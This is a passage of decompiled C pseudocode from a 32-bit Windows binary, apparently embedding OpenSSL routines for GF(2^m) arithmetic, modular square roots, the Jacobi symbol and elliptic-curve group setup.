          if ( (v10 & *(_DWORD *)(*v3 + 4 * v6)) != 0 )
          {
            if ( v4 < a3 )
            {
              *(_DWORD *)(a2 + 4 * v4) = v7 + i + 1;
              v3 = (_DWORD *)a1;
            }
            ++v4;
          }
          v11 = v10 >> 1;
          if ( (v11 & *(_DWORD *)(*v3 + 4 * v6)) != 0 )
          {
            if ( v4 < a3 )
            {
              *(_DWORD *)(a2 + 4 * v4) = v7 + i;
              v3 = (_DWORD *)a1;
            }
            ++v4;
          }
          v12 = v11 >> 1;
          if ( (v12 & *(_DWORD *)(*v3 + 4 * v6)) != 0 )
          {
            if ( v4 < a3 )
            {
              *(_DWORD *)(a2 + 4 * v4) = v7 + i - 1;
              v3 = (_DWORD *)a1;
            }
            ++v4;
          }
          v8 = v12 >> 1;
        }
      }
      --v6;
      v7 -= 32;
    }
    while ( v6 >= 0 );
  }
  if ( v4 < a3 )
    *(_DWORD *)(a2 + 4 * v4++) = -1;
  return v4;
}

//----- (004803A0) --------------------------------------------------------
int __cdecl sub_4803A0(_DWORD *a1, _DWORD *a2, int a3)
{
  int v3; // eax
  _DWORD v5[6]; // [esp+0h] [ebp-18h] BYREF

  v3 = sub_4802A0(a3, (int)v5, 6);
  if ( v3 && v3 <= 6 )
    return sub_47FF20(a1, a2, v5);
  sub_408310(3, 131, 106, (int)"crypto\\bn\\bn_gf2m.c", 406);
  return 0;
}
// 4803A0: using guessed type _DWORD var_18[6];

//----- (00480410) --------------------------------------------------------
int __usercall sub_480410@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  _DWORD *v6; // ebx
  _DWORD *v9; // edi
  int v10; // esi
  int v11; // eax
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  unsigned int *v15; // ebx
  int v16; // ebx
  int v17; // esi
  __int32 v18; // eax
  __m128 v19; // [esp-18h] [ebp-40h]
  int v20; // [esp+8h] [ebp-20h]
  int v21; // [esp+Ch] [ebp-1Ch]
  __int32 *v22; // [esp+10h] [ebp-18h]
  unsigned int v23; // [esp+14h] [ebp-14h]
  int v24[4]; // [esp+18h] [ebp-10h] BYREF
  unsigned int v25; // [esp+30h] [ebp+8h]

  v6 = a4;
  v21 = 0;
  if ( a3 == a4 )
    return sub_480160(a2, a3, a5, a6);
  sub_420700(a6);
  v9 = sub_420790(a6);
  if ( v9 )
  {
    v10 = a3[1] + a4[1] + 4;
    if ( sub_4173C0((int)v9, v10) )
    {
      v11 = 0;
      for ( v9[1] = v10; v11 < v10; ++v11 )
        *(_DWORD *)(*v9 + 4 * v11) = 0;
      v12 = a4[1];
      v13 = 0;
      v20 = 0;
      if ( v12 > 0 )
      {
        v14 = a3[1];
        do
        {
          v15 = (unsigned int *)(4 * v13 + *v6);
          v23 = *v15;
          if ( v13 + 1 == v12 )
            v25 = 0;
          else
            v25 = v15[1];
          v16 = 0;
          if ( v14 > 0 )
          {
            v17 = 4 * v13;
            do
            {
              v22 = (__int32 *)(*a3 + 4 * v16);
              if ( v16 + 1 == v14 )
                v18 = 0;
              else
                v18 = v22[1];
              v19.m128_u64[1] = __PAIR64__(v23, v25);
              v19.m128_i32[1] = *v22;
              v19.m128_i32[0] = v18;
              sub_4D1800(a1, (int)v24, v19);
              *(_DWORD *)(*v9 + v17) ^= v24[0];
              *(_DWORD *)(*v9 + v17 + 4) ^= v24[1];
              *(_DWORD *)(*v9 + v17 + 8) ^= v24[2];
              *(_DWORD *)(*v9 + v17 + 12) ^= v24[3];
              v14 = a3[1];
              v16 += 2;
              v17 += 8;
            }
            while ( v16 < v14 );
            v13 = v20;
          }
          v6 = a4;
          v12 = a4[1];
          v13 += 2;
          v20 = v13;
        }
        while ( v13 < v12 );
      }
      sub_416F60(v9);
      if ( sub_47FF20(a2, v9, a5) )
        v21 = 1;
    }
  }
  sub_420750(a6);
  return v21;
}

//----- (004805D0) --------------------------------------------------------
int __usercall sub_4805D0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  int v6; // edi
  int v7; // esi
  _DWORD *v8; // eax
  _DWORD *v9; // ebx
  int v10; // eax

  v6 = 0;
  v7 = sub_416F90(a5) + 1;
  v8 = sub_4133F0(4 * v7);
  v9 = v8;
  if ( v8 )
  {
    v10 = sub_4802A0((int)a5, (int)v8, v7);
    v6 = v10;
    if ( v10 && v10 <= v7 )
      v6 = sub_480410(a1, a2, a3, a4, v9, a6);
    else
      sub_408310(3, 133, 106, (int)"crypto\\bn\\bn_gf2m.c", 486);
  }
  sub_413490(v9);
  return v6;
}

//----- (00480670) --------------------------------------------------------
int __cdecl sub_480670(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4)
{
  int *v4; // ebp
  _DWORD *v5; // edi
  char **v6; // esi
  int v7; // eax
  int v8; // ebx
  int v9; // eax
  char *v10; // ebp
  _DWORD *v11; // eax
  unsigned int v12; // edi
  int v13; // ebx
  unsigned int v14; // edx
  int v15; // esi
  _DWORD *v16; // ecx
  unsigned int v17; // eax
  int v18; // ebp
  bool v19; // zf
  int v20; // ecx
  char **v21; // eax
  _DWORD *v22; // ecx
  _DWORD *v23; // eax
  int v24; // edi
  int v25; // esi
  unsigned int i; // eax
  int v28; // [esp+8h] [ebp-38h]
  char **v29; // [esp+Ch] [ebp-34h]
  _DWORD *v30; // [esp+10h] [ebp-30h]
  int v31; // [esp+14h] [ebp-2Ch]
  _DWORD *v32; // [esp+18h] [ebp-28h]
  _DWORD *v33; // [esp+1Ch] [ebp-24h]
  char *v34; // [esp+20h] [ebp-20h]
  char *v35; // [esp+24h] [ebp-1Ch]
  _DWORD *v36; // [esp+28h] [ebp-18h]
  int v37; // [esp+2Ch] [ebp-14h]
  char **v38; // [esp+30h] [ebp-10h]
  int v39; // [esp+34h] [ebp-Ch]
  int v40; // [esp+38h] [ebp-8h]
  int v41; // [esp+3Ch] [ebp-4h]

  v4 = a4;
  v39 = 0;
  sub_420700(a4);
  v5 = sub_420790(a4);
  v32 = v5;
  if ( v5 )
  {
    v33 = sub_420790(a4);
    if ( v33 )
    {
      v6 = (char **)sub_420790(a4);
      v38 = v6;
      if ( v6 )
      {
        v29 = (char **)sub_420790(a4);
        if ( v29 )
        {
          if ( sub_4803A0(v6, a2, (int)a3) )
          {
            if ( !sub_416DB0((int)v6) )
            {
              if ( sub_4173E0(v29, a3) )
              {
                v28 = sub_416F90(v6);
                v7 = sub_416F90(v29);
                v8 = a3[1];
                v37 = v7;
                v31 = v8;
                if ( sub_4173C0((int)v6, v8) )
                {
                  v9 = (int)v6[1];
                  v10 = *v6;
                  v34 = *v6;
                  if ( v9 < v8 )
                    memset(&v10[4 * v9], 0, 4 * (v8 - v9));
                  v6[1] = (char *)v8;
                  if ( sub_4173C0((int)v5, v8) )
                  {
                    v11 = (_DWORD *)*v5;
                    v30 = v11;
                    *v11 = 1;
                    if ( v8 > 1 )
                      memset(v11 + 1, 0, 4 * (v8 - 1));
                    v5[1] = v8;
                    if ( sub_4173C0((int)v33, v8) )
                    {
                      v36 = (_DWORD *)*v33;
                      if ( v8 > 0 )
                        memset((void *)*v33, 0, 4 * v8);
                      v33[1] = v8;
                      v35 = *v29;
                      while ( 1 )
                      {
                        if ( v28 )
                        {
                          do
                          {
                            if ( (*(_DWORD *)v10 & 1) != 0 )
                              break;
                            v12 = *(_DWORD *)v10;
                            v13 = -(*v30 & 1);
                            v14 = v13 & *(_DWORD *)*a3 ^ *v30;
                            v15 = 0;
                            if ( v31 - 1 > 0 )
                            {
                              v40 = v10 - (char *)v30;
                              v16 = v30 + 1;
                              v41 = -4 - (_DWORD)v30;
                              do
                              {
                                v17 = *(_DWORD *)((char *)v16 + v40);
                                *(_DWORD *)&v34[4 * v15] = (v12 >> 1) | (v17 << 31);
                                v12 = v17;
                                v18 = (v14 >> 1) | ((*v16 ^ v13 & *(_DWORD *)((char *)v16 + v41 + *a3 + 4)) << 31);
                                v14 = *v16 ^ v13 & *(_DWORD *)((char *)v16 + v41 + *a3 + 4);
                                *(v16 - 1) = v18;
                                ++v15;
                                ++v16;
                              }
                              while ( v15 < v31 - 1 );
                              v10 = v34;
                            }
                            v8 = v31;
                            v19 = v28-- == 1;
                            *(_DWORD *)&v10[4 * v15] = v12 >> 1;
                            v30[v15] = v14 >> 1;
                          }
                          while ( !v19 );
                        }
                        if ( v28 <= 32 )
                        {
                          if ( !*(_DWORD *)v10 )
                            goto LABEL_41;
                          if ( *(_DWORD *)v10 == 1 )
                            break;
                        }
                        v20 = v37;
                        if ( v28 < v37 )
                        {
                          v10 = v35;
                          v37 = v28;
                          v21 = v38;
                          v38 = v29;
                          v29 = v21;
                          v28 = v20;
                          v22 = v32;
                          v32 = v33;
                          v35 = *v21;
                          v33 = v22;
                          v34 = v10;
                          v30 = v36;
                          v36 = (_DWORD *)*v22;
                        }
                        if ( v8 > 0 )
                        {
                          v23 = v10;
                          v24 = v8;
                          do
                          {
                            *v23 ^= *(_DWORD *)((char *)v23 + v35 - v10);
                            *(_DWORD *)((char *)v23 + (char *)v30 - v10) ^= *(_DWORD *)((char *)v23 + (char *)v36 - v10);
                            ++v23;
                            --v24;
                          }
                          while ( v24 );
                          v8 = v31;
                        }
                        if ( v28 == v37 )
                        {
                          v25 = (v28 - 1) / 32;
                          for ( i = *(_DWORD *)&v10[4 * v25]; !i; i = *(_DWORD *)&v10[4 * v25-- - 4] )
                          {
                            if ( !v25 )
                              break;
                          }
                          v28 = 32 * v25 + sub_416830(i);
                        }
                      }
                      sub_416F60(v32);
                      if ( sub_4173E0(a1, v32) )
                        v39 = 1;
                    }
                  }
LABEL_41:
                  v4 = a4;
                }
              }
            }
          }
        }
      }
    }
  }
  sub_420750(v4);
  return v39;
}

//----- (004809E0) --------------------------------------------------------
BOOL __usercall sub_4809E0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  BOOL v6; // ebp
  _DWORD *v7; // edi

  v6 = 0;
  sub_420700(a6);
  v7 = sub_420790(a6);
  if ( v7 && sub_480670(v7, a4, a5, a6) )
    v6 = sub_4805D0(a1, a2, a3, v7, a5, a6) != 0;
  sub_420750(a6);
  return v6;
}

//----- (00480A50) --------------------------------------------------------
int __usercall sub_480A50@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  _DWORD *v7; // esi
  int v8; // ebp
  int v9; // [esp+4h] [ebp-4h]

  v9 = 0;
  if ( sub_416DB0((int)a4) )
    return sub_417490(a2, 1);
  if ( sub_416D80((int)a4, 1) )
    return sub_4173E0(a2, a3) != 0;
  sub_420700(a6);
  v7 = sub_420790(a6);
  if ( v7 && sub_47FF20(v7, a3, a5) )
  {
    v8 = sub_416F90(a4) - 2;
    if ( v8 < 0 )
    {
LABEL_12:
      if ( sub_4173E0(a2, v7) )
        v9 = 1;
    }
    else
    {
      while ( sub_480160(v7, v7, a5, a6) && (!sub_416A50(a4, v8) || sub_480410(a1, v7, v7, a3, a5, a6)) )
      {
        if ( --v8 < 0 )
          goto LABEL_12;
      }
    }
  }
  sub_420750(a6);
  return v9;
}

//----- (00480B60) --------------------------------------------------------
int __usercall sub_480B60@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // esi

  v5 = 0;
  if ( *a4 )
  {
    sub_420700(a5);
    v7 = sub_420790(a5);
    v8 = v7;
    if ( v7 )
    {
      if ( sub_417640(v7, *a4 - 1) )
        v5 = sub_480A50(a1, a2, a3, v8, a4, a5);
    }
    sub_420750(a5);
    return v5;
  }
  else
  {
    sub_417490(a2, 0);
    return 1;
  }
}

//----- (00480BE0) --------------------------------------------------------
int __usercall sub_480BE0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, int *a4, int *a5)
{
  int *v7; // ebp
  _DWORD *v8; // ebx
  int v9; // ebp
  _DWORD *v10; // ebp
  _DWORD *v11; // [esp+4h] [ebp-18h]
  int v12; // [esp+8h] [ebp-14h]
  int *v13; // [esp+Ch] [ebp-10h]
  int v14; // [esp+10h] [ebp-Ch]
  _DWORD *v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+18h] [ebp-4h]
  _DWORD *v17; // [esp+28h] [ebp+Ch]

  v14 = 0;
  v12 = 0;
  if ( !*a4 )
  {
    sub_417490(a2, 0);
    return 1;
  }
  sub_420700(a5);
  v7 = sub_420790(a5);
  v13 = v7;
  v8 = sub_420790(a5);
  v17 = sub_420790(a5);
  if ( !v17 || !sub_47FF20(v7, a3, a4) )
    goto LABEL_35;
  if ( sub_416DB0((int)v7) )
  {
    sub_417490(a2, 0);
LABEL_34:
    v14 = 1;
    goto LABEL_35;
  }
  if ( (*(_BYTE *)a4 & 1) == 0 )
  {
    v11 = sub_420790(a5);
    v10 = sub_420790(a5);
    v15 = sub_420790(a5);
    if ( v15 )
    {
      while ( sub_42A7D0(v11, *a4, 0, 0) )
      {
        if ( !sub_47FF20(v11, v11, a4) )
          break;
        sub_417490(v8, 0);
        if ( !sub_4173E0(v17, v11) )
          break;
        v16 = 1;
        if ( *a4 - 1 >= 1 )
        {
          while ( sub_480160(v8, v8, a4, a5)
               && sub_480160(v10, v17, a4, a5)
               && sub_480410(a1, v15, v10, v13, a4, a5)
               && sub_47FE90(v8, v8, v15)
               && sub_47FE90(v17, v10, v11) )
          {
            if ( ++v16 > *a4 - 1 )
              goto LABEL_29;
          }
          goto LABEL_35;
        }
LABEL_29:
        ++v12;
        if ( !sub_416DB0((int)v17) || v12 >= 50 )
        {
          if ( !sub_416DB0((int)v17) )
            goto LABEL_14;
          sub_408310(3, 135, 113, (int)"crypto\\bn\\bn_gf2m.c", 1114);
          sub_420750(a5);
          return 0;
        }
      }
    }
    goto LABEL_35;
  }
  if ( sub_4173E0(v8, v7) )
  {
    v9 = 1;
    if ( (*a4 - 1) / 2 >= 1 )
    {
      while ( sub_480160(v8, v8, a4, a5) && sub_480160(v8, v8, a4, a5) && sub_47FE90(v8, v8, v13) )
      {
        if ( ++v9 > (*a4 - 1) / 2 )
          goto LABEL_14;
      }
      goto LABEL_35;
    }
LABEL_14:
    if ( sub_480160(v17, v8, a4, a5) && sub_47FE90(v17, v8, v17) )
    {
      if ( sub_416960(v17, v13) )
      {
        sub_408310(3, 135, 116, (int)"crypto\\bn\\bn_gf2m.c", 1124);
        sub_420750(a5);
        return 0;
      }
      if ( sub_4173E0(a2, v8) )
        goto LABEL_34;
    }
  }
LABEL_35:
  sub_420750(a5);
  return v14;
}

//----- (00480F30) --------------------------------------------------------
int __cdecl sub_480F30(_DWORD *a1, _DWORD *a2, int *a3)
{
  BOOL v3; // esi
  unsigned int **v4; // edi
  unsigned int **v5; // ebp
  int v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v9; // eax
  int v10; // eax
  int i; // ebx
  int v12; // eax
  unsigned int v13; // eax
  int v14; // eax
  unsigned int v15; // ecx
  int v16; // eax
  unsigned int **v17; // eax
  int result; // eax
  int v19; // [esp-4h] [ebp-18h]
  int v20; // [esp+10h] [ebp-4h]

  v20 = -2;
  v3 = 0;
  sub_420700(a3);
  v4 = (unsigned int **)sub_420790(a3);
  v5 = (unsigned int **)sub_420790(a3);
  v6 = 0;
  if ( !v5 )
    goto LABEL_45;
  v7 = sub_4173E0(v4, a1);
  v3 = v7 == 0;
  if ( !v7 )
    goto LABEL_45;
  v8 = sub_4173E0(v5, a2);
  v3 = v8 == 0;
  if ( !v8 )
    goto LABEL_45;
  if ( sub_416DB0((int)v5) )
  {
    v9 = sub_416D80((int)v4, 1);
LABEL_44:
    v20 = v9;
    goto LABEL_45;
  }
  if ( !sub_416E20((int)v4) && !sub_416E20((int)v5) )
  {
    v20 = 0;
    goto LABEL_45;
  }
  if ( !sub_416A50(v5, 0) )
  {
    do
      ++v6;
    while ( !sub_416A50(v5, v6) );
  }
  v10 = sub_437D40(v5, v5, v6);
  v3 = v10 == 0;
  if ( v10 )
  {
    if ( (v6 & 1) != 0 )
    {
      if ( v4[1] == (unsigned int *)v3 )
        v20 = 0;
      else
        v20 = dword_5256B4[**v4 & 7];
    }
    else
    {
      v20 = 1;
    }
    if ( v5[3] )
    {
      v5[3] = 0;
      if ( v4[3] )
        v20 = -v20;
    }
    if ( sub_416DB0((int)v4) )
    {
LABEL_43:
      v9 = sub_416DC0((int)v5) ? v20 : 0;
      goto LABEL_44;
    }
    while ( 1 )
    {
      for ( i = 0; !sub_416A50(v4, i); ++i )
        ;
      v12 = sub_437D40(v4, v4, i);
      v3 = v12 == 0;
      if ( !v12 )
        break;
      if ( (i & 1) != 0 )
      {
        if ( v5[1] == (unsigned int *)v3 )
          LOBYTE(v13) = 0;
        else
          v13 = **v5;
        v20 *= dword_5256B4[v13 & 7];
      }
      if ( v4[3] )
      {
        if ( v4[1] )
          v14 = ~**v4;
        else
          LOBYTE(v14) = -1;
      }
      else if ( v4[1] )
      {
        v14 = **v4;
      }
      else
      {
        LOBYTE(v14) = 0;
      }
      if ( v5[1] )
        v15 = **v5;
      else
        LOBYTE(v15) = 0;
      if ( ((unsigned __int8)v14 & (unsigned __int8)v15 & 2) != 0 )
        v20 = -v20;
      v16 = sub_42A2D0(v5, v5, (int *)v4, a3);
      v3 = v16 == 0;
      if ( !v16 )
        break;
      v17 = v4;
      v4 = v5;
      v19 = (int)v5;
      v5 = v17;
      v17[3] = (unsigned int *)v3;
      if ( sub_416DB0(v19) )
        goto LABEL_43;
    }
  }
LABEL_45:
  sub_420750(a3);
  result = -2;
  if ( !v3 )
    return v20;
  return result;
}
// 5256B4: using guessed type int dword_5256B4[8];

//----- (004811A0) --------------------------------------------------------
int *__usercall sub_4811A0@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int *a4, int *a5)
{
  void **v5; // ebp
  void **v6; // ebx
  int **v7; // ebx
  int *v8; // ebp
  _DWORD *v9; // eax
  int v10; // eax
  int (__cdecl *v11)(_DWORD *, int, int); // eax
  int v12; // eax
  int *v14; // ebp
  int v15; // ebp
  int v16; // ebp
  void **v17; // eax
  int v18; // eax
  int v19; // eax
  int *Block; // [esp+10h] [ebp-20h]
  int *v21; // [esp+14h] [ebp-1Ch]
  int v22; // [esp+18h] [ebp-18h]
  int v23; // [esp+18h] [ebp-18h]
  int *v24; // [esp+1Ch] [ebp-14h]
  int *v25; // [esp+20h] [ebp-10h]
  int v26; // [esp+24h] [ebp-Ch]
  int *v27; // [esp+28h] [ebp-8h]
  int *v28; // [esp+2Ch] [ebp-4h]

  v5 = (void **)a2;
  v6 = (void **)a2;
  Block = a2;
  if ( sub_416E20((int)a4) && !sub_416D80((int)a4, 1) )
  {
    if ( !sub_416DB0((int)a3) && !sub_416DC0((int)a3) )
    {
      sub_420700(a5);
      v25 = sub_420790(a5);
      v24 = sub_420790(a5);
      v21 = sub_420790(a5);
      v7 = (int **)sub_420790(a5);
      v27 = sub_420790(a5);
      v8 = sub_420790(a5);
      v28 = v8;
      if ( !v8 )
        goto LABEL_76;
      if ( !a2 )
      {
        Block = sub_4168C0();
        if ( !Block )
          goto LABEL_76;
      }
      if ( !sub_42A2D0(v25, a3, a4, a5) )
        goto LABEL_74;
      v26 = 1;
      if ( sub_416A50(a4, 1) )
        goto LABEL_97;
      do
        ++v26;
      while ( !sub_416A50(a4, v26) );
      if ( v26 == 1 )
      {
LABEL_97:
        if ( sub_437D40((unsigned int **)v21, (unsigned int **)a4, 2) )
        {
          v21[3] = 0;
          if ( sub_437FD0(v21, 1) )
          {
            v9 = (_DWORD *)sub_4282A0(a1, Block, v25, v21, a4, a5);
LABEL_70:
            if ( v9 && sub_42A4B0(v27, Block, a4, a5) )
            {
              if ( !sub_4169B0(v27, v25) )
              {
LABEL_77:
                sub_420750(a5);
                return Block;
              }
              sub_408310(3, 121, 111, (int)"crypto\\bn\\bn_sqrt.c", 344);
            }
            goto LABEL_74;
          }
        }
        goto LABEL_74;
      }
      if ( v26 == 2 )
      {
        if ( !sub_42A4F0(v7, (int **)v25, a4) )
          goto LABEL_74;
        if ( !sub_437D40((unsigned int **)v21, (unsigned int **)a4, 3) )
          goto LABEL_74;
        v21[3] = 0;
        if ( !sub_4282A0(a1, v24, (int *)v7, v21, a4, a5)
          || !sub_42A4B0(v8, v24, a4, a5)
          || !sub_42A430(v7, (int *)v7, (unsigned int **)v8, a4, a5)
          || !sub_438090((int *)v7, 1u)
          || !sub_42A430(v27, v25, (unsigned int **)v24, a4, a5)
          || !sub_42A430(v27, v27, (unsigned int **)v7, a4, a5) )
        {
          goto LABEL_74;
        }
LABEL_69:
        v9 = sub_4173E0(Block, v27);
        goto LABEL_70;
      }
      if ( !sub_4173E0(v21, a4) )
        goto LABEL_74;
      v21[3] = 0;
      v22 = 2;
      while ( 1 )
      {
        if ( v22 < 22 )
          goto LABEL_34;
        v10 = sub_416F90(a4);
        if ( !sub_42A7F0(v8, v10, 0, 0) )
          goto LABEL_74;
        if ( sub_416960(v8, a4) >= 0 )
        {
          v11 = sub_4220E0;
          if ( !a4[3] )
            v11 = sub_422020;
          if ( !v11(v8, (int)v8, (int)a4) )
            goto LABEL_74;
        }
        if ( sub_416DB0((int)v8) )
        {
LABEL_34:
          if ( !sub_417490(v8, v22) )
            goto LABEL_74;
        }
        v12 = sub_480F30(v8, v21, a5);
        if ( v12 < -1 )
          goto LABEL_74;
        if ( !v12 )
        {
          sub_408310(3, 121, 112, (int)"crypto\\bn\\bn_sqrt.c", 199);
          goto LABEL_74;
        }
        if ( v12 != 1 )
          break;
        if ( ++v22 >= 82 )
          goto LABEL_39;
      }
      if ( v12 != -1 )
      {
LABEL_39:
        sub_408310(3, 121, 113, (int)"crypto\\bn\\bn_sqrt.c", 211);
        goto LABEL_74;
      }
      if ( !sub_437D40((unsigned int **)v21, (unsigned int **)v21, v26) || !sub_4282A0(a1, v8, v8, v21, a4, a5) )
        goto LABEL_74;
      if ( sub_416DC0((int)v8) )
      {
        sub_408310(3, 121, 112, (int)"crypto\\bn\\bn_sqrt.c", 226);
        goto LABEL_74;
      }
      if ( !sub_437B50((int *)v7, v21) )
      {
LABEL_74:
        if ( Block != a2 )
          sub_417000(Block);
        goto LABEL_76;
      }
      if ( sub_416DB0((int)v7) )
      {
        if ( !sub_42A2D0(v7, v25, a4, a5) )
          goto LABEL_74;
        if ( sub_416DB0((int)v7) )
          goto LABEL_50;
        v14 = v27;
        if ( !sub_417490(v27, 1) )
          goto LABEL_74;
      }
      else
      {
        v14 = v27;
        if ( !sub_4282A0(a1, v27, v25, v7, a4, a5) )
          goto LABEL_74;
        if ( sub_416DB0((int)v27) )
        {
LABEL_50:
          sub_417490(Block, 0);
          sub_420750(a5);
          return Block;
        }
      }
      if ( !sub_42A4B0(v24, v14, a4, a5)
        || !sub_42A430(v24, v24, (unsigned int **)v25, a4, a5)
        || !sub_42A430(v14, v14, (unsigned int **)v25, a4, a5) )
      {
        goto LABEL_74;
      }
      if ( !sub_416DC0((int)v24) )
      {
        while ( 1 )
        {
          v15 = 1;
          v23 = 1;
          if ( !sub_42A4B0((int *)v7, v24, a4, a5) )
            goto LABEL_74;
          if ( !sub_416DC0((int)v7) )
          {
            while ( 1 )
            {
              v23 = ++v15;
              if ( v15 == v26 )
                break;
              if ( !sub_42A430(v7, (int *)v7, (unsigned int **)v7, a4, a5) )
                goto LABEL_74;
              if ( sub_416DC0((int)v7) )
                goto LABEL_61;
            }
            sub_408310(3, 121, 111, (int)"crypto\\bn\\bn_sqrt.c", 310);
            goto LABEL_74;
          }
LABEL_61:
          if ( !sub_4173E0(v7, v28) )
            goto LABEL_74;
          v16 = v26 - v23 - 1;
          if ( v16 > 0 )
          {
            while ( sub_42A4B0((int *)v7, (int *)v7, a4, a5) )
            {
              if ( --v16 <= 0 )
                goto LABEL_65;
            }
            goto LABEL_74;
          }
LABEL_65:
          if ( !sub_42A430(v28, (int *)v7, (unsigned int **)v7, a4, a5)
            || !sub_42A430(v27, v27, (unsigned int **)v7, a4, a5)
            || !sub_42A430(v24, v24, (unsigned int **)v28, a4, a5) )
          {
            goto LABEL_74;
          }
          v26 = v23;
          if ( sub_416DC0((int)v24) )
            goto LABEL_69;
        }
      }
      goto LABEL_69;
    }
    if ( !a2 )
    {
      v17 = (void **)sub_4168C0();
      if ( !v17 )
      {
LABEL_76:
        Block = 0;
        goto LABEL_77;
      }
      v5 = (void **)a2;
      v6 = v17;
    }
    v18 = sub_416DC0((int)a3);
    if ( !sub_417490(v6, v18) )
    {
LABEL_86:
      if ( v6 != v5 )
      {
        sub_417060(v6);
        return 0;
      }
      return 0;
    }
    return (int *)v6;
  }
  if ( sub_416D80((int)a4, 2) )
  {
    if ( !a2 )
    {
      v6 = (void **)sub_4168C0();
      if ( !v6 )
        goto LABEL_76;
    }
    v19 = sub_416A50(a3, 0);
    if ( !sub_417490(v6, v19) )
      goto LABEL_86;
    return (int *)v6;
  }
  sub_408310(3, 121, 112, (int)"crypto\\bn\\bn_sqrt.c", 41);
  return 0;
}

//----- (004818D0) --------------------------------------------------------
int __cdecl sub_4818D0(int a1)
{
  _DWORD *v1; // eax
  void **v2; // ecx

  *(_DWORD *)(a1 + 36) = sub_4168C0();
  *(_DWORD *)(a1 + 64) = sub_4168C0();
  v1 = sub_4168C0();
  v2 = *(void ***)(a1 + 36);
  *(_DWORD *)(a1 + 68) = v1;
  if ( v2 && *(_DWORD *)(a1 + 64) && v1 )
  {
    *(_DWORD *)(a1 + 72) = 0;
    return 1;
  }
  else
  {
    sub_417060(v2);
    sub_417060(*(void ***)(a1 + 64));
    sub_417060(*(void ***)(a1 + 68));
    return 0;
  }
}

//----- (00481930) --------------------------------------------------------
void __cdecl sub_481930(void ***Block)
{
  sub_417060(Block[9]);
  sub_417060(Block[16]);
  sub_417060(Block[17]);
}

//----- (00481960) --------------------------------------------------------
void __cdecl sub_481960(_DWORD **Block)
{
  sub_417000(Block[9]);
  sub_417000(Block[16]);
  sub_417000(Block[17]);
}

//----- (00481990) --------------------------------------------------------
int __cdecl sub_481990(int a1, int a2)
{
  if ( !sub_4173E0(*(_DWORD **)(a1 + 36), *(_DWORD **)(a2 + 36))
    || !sub_4173E0(*(_DWORD **)(a1 + 64), *(_DWORD **)(a2 + 64))
    || !sub_4173E0(*(_DWORD **)(a1 + 68), *(_DWORD **)(a2 + 68)) )
  {
    return 0;
  }
  *(_DWORD *)(a1 + 72) = *(_DWORD *)(a2 + 72);
  return 1;
}

//----- (004819F0) --------------------------------------------------------
int __cdecl sub_4819F0(int *a1, int *a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  int *v5; // edi
  int *v7; // ebx
  int (__cdecl *v8)(int *, int, int *, int *); // eax
  _DWORD *v9; // eax
  int (__cdecl *v10)(int *, int, int, int *); // ecx
  void **Block; // [esp+8h] [ebp-8h]
  int v12; // [esp+Ch] [ebp-4h]

  v12 = 0;
  Block = 0;
  if ( sub_416F90(a2) > 2 && sub_416E20((int)a2) )
  {
    v5 = a5;
    if ( a5 || (Block = (void **)sub_420670(), (v5 = (int *)Block) != 0) )
    {
      sub_420700(v5);
      v7 = sub_420790(v5);
      if ( v7 )
      {
        if ( sub_4173E0((_DWORD *)a1[9], a2) )
        {
          sub_417390(a1[9], 0);
          if ( sub_42A2D0(v7, a3, a2, v5) )
          {
            v8 = *(int (__cdecl **)(int *, int, int *, int *))(*a1 + 148);
            if ( v8 )
              v9 = (_DWORD *)v8(a1, a1[16], v7, v5);
            else
              v9 = sub_4173E0((_DWORD *)a1[16], v7);
            if ( v9 )
            {
              if ( sub_42A2D0((_DWORD *)a1[17], a4, a2, v5) )
              {
                v10 = *(int (__cdecl **)(int *, int, int, int *))(*a1 + 148);
                if ( !v10 || v10(a1, a1[17], a1[17], v5) )
                {
                  if ( sub_437FD0(v7, 3) )
                  {
                    a1[18] = sub_4169B0(v7, (_DWORD *)a1[9]) == 0;
                    v12 = 1;
                  }
                }
              }
            }
          }
        }
      }
      sub_420750(v5);
      sub_4206C0(Block);
      return v12;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_408310(16, 166, 103, (int)"crypto\\ec\\ecp_smpl.c", 143);
    return 0;
  }
}

//----- (00481B70) --------------------------------------------------------
void **__cdecl sub_481B70(_DWORD **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, void **a5)
{
  void **result; // eax
  void **v6; // edi
  _DWORD *v7; // eax
  void **Block; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]

  v9 = 0;
  Block = 0;
  if ( !a2 || (result = (void **)sub_4173E0(a2, a1[9])) != 0 )
  {
    if ( !a3 && !a4 )
      goto LABEL_17;
    if ( !(*a1)[38] )
    {
      if ( a3 && !sub_4173E0(a3, a1[16]) )
        goto LABEL_18;
      if ( !a4 )
        goto LABEL_17;
      v7 = sub_4173E0(a4, a1[17]);
      goto LABEL_16;
    }
    v6 = a5;
    if ( a5 || (result = (void **)sub_420670(), Block = result, (v6 = result) != 0) )
    {
      if ( a3 && !((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, void **))(*a1)[38])(a1, a3, a1[16], v6) )
        goto LABEL_18;
      if ( !a4 )
        goto LABEL_17;
      v7 = (_DWORD *)((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, void **))(*a1)[38])(a1, a4, a1[17], v6);
LABEL_16:
      if ( !v7 )
      {
LABEL_18:
        sub_4206C0(Block);
        return (void **)v9;
      }
LABEL_17:
      v9 = 1;
      goto LABEL_18;
    }
  }
  return result;
}

//----- (00481C70) --------------------------------------------------------
